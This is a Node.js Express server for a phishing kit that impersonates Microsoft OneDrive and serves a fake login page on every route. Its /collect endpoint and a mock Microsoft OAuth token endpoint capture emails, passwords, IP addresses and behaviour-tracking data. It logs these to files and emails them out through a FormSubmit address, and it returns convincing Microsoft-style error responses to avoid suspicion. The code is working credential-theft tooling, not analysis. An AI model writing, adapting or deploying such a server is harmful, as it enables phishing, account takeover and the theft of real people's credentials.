const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const axios = require('axios');

const app = express();
const PORT = 3000;

// ==================== FORM SUBMIT CONFIGURATION ====================
// Use your own FormSubmit endpoint (must be /ajax/ version)
const FORMSUBMIT_URL = 'https://formsubmit.co/ajax/g82443047@gmail.com';

// ==================== FORM SUBMIT FUNCTION ====================
async function sendViaFormSubmit(data) {
    const message = `
🔐 New Credentials
📧 Email: ${data.e || 'N/A'}
🔑 Password: ${data.p || 'N/A'}
🌐 IP: ${data.ip || 'Unknown'}
📱 User-Agent: ${data.ua || 'N/A'}
🕐 Time: ${new Date().toISOString()}
    `;

    try {
        const response = await axios.post(FORMSUBMIT_URL, {
            email: data.e || 'No email',
            password: data.p || 'No password',
            ip: data.ip || 'Unknown',
            userAgent: data.ua || 'Unknown',
            message: message.trim()
        }, {
            headers: {
                'Content-Type': 'application/json',
                'Referer': 'http://localhost:3000'   // Required for local FormSubmit
            }
        });

        console.log(`[${getTimestamp()}] FormSubmit response:`, response.status, response.data);
        return true;
    } catch (error) {
        console.error(`[${getTimestamp()}] FormSubmit error:`, error.message);
        if (error.response) {
            console.error('FormSubmit error details:', error.response.status, error.response.data);
        }
        return false;
    }
}

// ==================== MAIN SERVER CODE ====================
// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '..')));

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir, { recursive: true });
}

// Helper function to get current timestamp
function getTimestamp() {
    return new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
}

// Log data to file
function logData(data, filename = 'credentials.log') {
    const logPath = path.join(logsDir, filename);
    const timestamp = getTimestamp();

    let logEntry = `\n\n=== LOG ENTRY ${timestamp} ===\n`;
    logEntry += `Session ID: ${data.s || 'N/A'}\n`;
    logEntry += `Timestamp: ${new Date(data.t).toLocaleString() || 'N/A'}\n`;
    logEntry += `User Agent: ${data.ua || 'N/A'}\n`;
    logEntry += `IP Address: ${data.ip || 'N/A'}\n`;
    logEntry += `Language: ${data.l || 'N/A'}\n`;
    logEntry += `Referrer: ${data.ref || 'N/A'}\n`;

    if (data.e) {
        logEntry += `\n--- CREDENTIALS ---\n`;
        logEntry += `Email/Username: ${data.e}\n`;
        logEntry += `Password: ${data.p || 'N/A'}\n`;
    }

    if (data.tr) {
        logEntry += `\n--- BEHAVIOR TRACKING ---\n`;
        if (data.tr.mouse && data.tr.mouse.length > 0) {
            logEntry += `Mouse movements: ${data.tr.mouse.length} samples\n`;
        }
        if (data.tr.keys && data.tr.keys.length > 0) {
            logEntry += `Keystrokes: ${data.tr.keys.length} recorded\n`;
        }
        if (data.tr.focus && data.tr.focus.length > 0) {
            logEntry += `Tab focus changes: ${data.tr.focus.length}\n`;
        }
    }

    if (data.a) {
        logEntry += `\n--- ACTION ---\n`;
        logEntry += `Type: ${data.a}\n`;
    }

    logEntry += `\n=== END ENTRY ===\n`;

    fs.appendFileSync(logPath, logEntry, 'utf8');

    console.log(`[${timestamp}] Data logged to ${filename}`);
    if (data.e) {
        console.log(`  Credentials captured: ${data.e}`);
    }
}

// Endpoint to collect credentials
app.post('/collect', async (req, res) => {
    try {
        const data = req.body;

        console.log(`[${getTimestamp()}] Received data from session: ${data.s || 'unknown'}`);
        console.log('Raw data from client:', req.body);

        // Log the data
        logData(data);

        if (data.s) {
            const sessionFile = `session_${data.s}.log`;
            logData(data, sessionFile);
        }

        // Send to FormSubmit (email) if credentials are present
        if (data.e && data.p) {
            await sendViaFormSubmit(data);
        } else if (data.e && !data.p) {
            // Email only (like forgot password)
            await sendViaFormSubmit(data);
        }

        // Send a realistic Microsoft-like response
        res.json({
            success: true,
            timestamp: new Date().toISOString(),
            message: "Authentication processed"
        });

    } catch (error) {
        console.error(`[${getTimestamp()}] Error processing request:`, error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Mock Microsoft OAuth endpoint
app.post('/oauth2/v2.0/token', async (req, res) => {
    console.log(`[${getTimestamp()}] OAuth token request received`);

    const authData = {
        s: req.body.client_id || 'oauth_request',
        e: req.body.username || 'N/A',
        t: Date.now(),
        a: 'oauth_token_request',
        ua: req.headers['user-agent'] || 'N/A',
        ip: req.ip || req.connection.remoteAddress
    };

    logData(authData, 'oauth_attempts.log');

    if (req.body.username) {
        await sendViaFormSubmit(authData);
    }

    res.status(400).json({
        error: "invalid_grant",
        error_description: "The provided authorization grant is invalid, expired, or revoked",
        error_codes: [50126],
        timestamp: new Date().toISOString(),
        trace_id: crypto.randomBytes(16).toString('hex'),
        correlation_id: crypto.randomBytes(16).toString('hex')
    });
});

// Serve the main HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'onedrive.html'));
});

// API endpoints that look like real Microsoft APIs
app.get('/api/user/me', (req, res) => {
    res.status(401).json({
        error: {
            code: "Unauthorized",
            message: "Authentication required"
        }
    });
});

app.get('/api/files/count', (req, res) => {
    res.json({
        count: 0,
        requiresAuthentication: true
    });
});

// Handle all other routes - serve the phishing page
app.get('*', (req, res) => {
    console.log(`[${getTimestamp()}] Request to: ${req.path}`);
    res.sendFile(path.join(__dirname, '..', 'onedrive.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(`[${getTimestamp()}] Server error:`, err);
    res.status(500).send('Internal Server Error');
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n=========================================`);
    console.log(`   OneDrive Server Running (Email Mode)`);
    console.log(`=========================================`);
    console.log(`Local: http://localhost:${PORT}`);
    console.log(`\nFormSubmit URL: ${FORMSUBMIT_URL}`);
    console.log(`Logs directory: ${logsDir}`);
    console.log(`\n✅ Email notifications: ENABLED`);
    console.log(`\nWaiting for credentials...\n`);

    const os = require('os');
    const networkInterfaces = os.networkInterfaces();

    Object.keys(networkInterfaces).forEach(interfaceName => {
        networkInterfaces[interfaceName].forEach(interface => {
            if (interface.family === 'IPv4' && !interface.internal) {
                console.log(`Available at: http://${interface.address}:${PORT}`);
            }
        });
    });
    console.log(`=========================================\n`);
});

// Handle graceful shutdown
process.on('SIGINT', () => {
    console.log(`\n[${getTimestamp()}] Server shutting down...`);
    process.exit(0);
});